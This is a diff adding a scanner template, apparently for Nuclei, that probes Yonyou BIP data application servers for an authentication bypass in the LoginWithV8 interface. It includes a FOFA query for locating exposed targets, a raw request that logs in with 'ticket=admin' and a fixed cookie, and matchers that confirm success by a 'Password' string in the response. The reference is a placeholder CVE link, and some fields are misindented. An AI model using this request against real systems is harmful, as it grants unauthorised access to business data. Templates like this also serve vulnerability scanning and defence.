@@ -1,0 +1,30 @@
+id: yonyou-bip-loginwithv8-auth-bypass
+
+info:
+  name: 用友BIP数据应用服务LoginWithV8接口身份验证机制缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/bi/portal/manifest.json" || body="js/lib/ba.common.js" && body="用友"
+      reference:
+        - https://example.com/cve/CVE-2025-XXXXX
+      impact:
+        攻击者可通过构造特定请求绕过系统预设的身份验证流程，直接获取敏感业务接口访问权限。该缺陷源于LoginWithV8接口未正确校验用户身份凭证，导致认证机制失效。受影响组件包含数据应用服务核心认证模块，可能引发横向移动攻击及数据泄露风险。
+  tags: 用友BIP
+
+http:
+- raw:
+  - |
+    GET /bi/api/Portal/LoginWithV8/?ticket=admin HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: keep-alive
+    Cookie: _WorkbenchCross_=Ultraman
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Password'
